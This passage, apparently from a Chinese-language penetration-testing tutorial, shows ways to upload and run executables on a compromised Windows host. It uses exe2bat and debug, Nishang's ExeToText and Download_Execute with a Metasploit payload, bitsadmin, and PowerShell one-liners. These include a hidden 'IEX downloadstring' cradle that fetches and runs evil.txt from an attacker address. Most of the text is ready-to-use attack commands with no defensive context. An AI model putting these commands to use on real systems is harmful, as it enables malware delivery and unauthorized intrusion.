在kali中，exe2bat.exe工具位于/usr/share/windows\-binaries目录下。在该目录下执行如下命令，**把需要上传的ew.exe文件转换成十六进制HEX**的形式

```
wine exe2bat.exe ew.exe ew.txt
```

此时会生成一个ew.txt文件。

然后，利用目标服务器的Debug功能，将HEX代码还原为EXE文件。使用echo命令，将ew.txt里面的代码复制到目标系统的命令行环境中。依次执行命令，生成1.dll、123.hex、ew.exe。

使用debug是一种比较老的方法，exe2bat.exe只支持小于64KB的文件。

**利用Nishang上�**�

使用Nishang上传文件的原理：利用Nishang将上传的EXE文件转换为十六进制的形式，然后使用echo命令访问目标服务器，最后使用Download\_Execute脚本下载文本并将其转换为EXE文件

在这里，需要使用echo命令将Nishang PowerShell脚本的内容上传到目标服务器中，并将扩展名改为".ps1"

执行一下命令，利用Nishang中的exetotext.ps1脚本将msf.exe修改为文本文件msf.txt

```
.\ExeToText.ps1 msf.exe msf.txt
```

![cc491ac08fa561e6a20c5eed7145828c.png](image/cc491ac08fa561e6a20c5eed7145828c.png)

![27d7951612e6d9c2039e4c6cbb85d847.png](image/27d7951612e6d9c2039e4c6cbb85d847.png)

接着，通过echo命令，先将转换的HEX值添加到目标文件中，再将Nishang脚本文件的内容添加到目标文件中。

最后，输入如下命令，调用Download\_Execute脚本下载并执行该文本文件

```
Download_Execute http://192.168.111.156/msf.txt
```

**利用bitsadmin下载**

bitsadmin是一个命令行工具，Windows XP以后的Windows操作系统中自带该工具。

```
bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
```

![bc91e83d9a3d49ddda61aea16469ec17.png](image/bc91e83d9a3d49ddda61aea16469ec17.png)

**利用powershell下载**

PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。 

远程下载文件保存在本地：

```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe')
```

远程执行命令：

```
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"
```

![fa68b2fee1ee6b708630b30a44441141.png](image/fa68b2fee1ee6b708630b30a44441141.png)
